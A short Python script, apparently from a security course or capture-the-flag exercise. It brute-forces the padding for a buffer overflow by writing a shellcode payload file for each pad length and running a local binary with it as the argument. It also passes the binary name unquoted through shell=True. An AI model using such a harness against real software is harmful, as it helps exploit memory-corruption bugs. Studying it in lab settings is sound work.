import argparse
import subprocess
from shellcode import write_pld


parser = argparse.ArgumentParser()
parser.add_argument("addr", type=str)
parser.add_argument("binary", type=str)
parser.add_argument("max_pad", type=int)

if __name__ == '__main__':
	args = parser.parse_args()

	addr = args.addr
	while len(addr) < 8:
		addr = "0" + addr

	binary = args.binary
	max_pad = args.max_pad

	for pad in range(max_pad + 1):
		# Write pld
		write_pld(addr, pad)
		# Attempt overflow
		process = subprocess.Popen('./' + binary + ' `cat pld`', shell=True)
		process.wait()
		print("Pad: " + str(pad) + " returns: " + str(process.returncode))
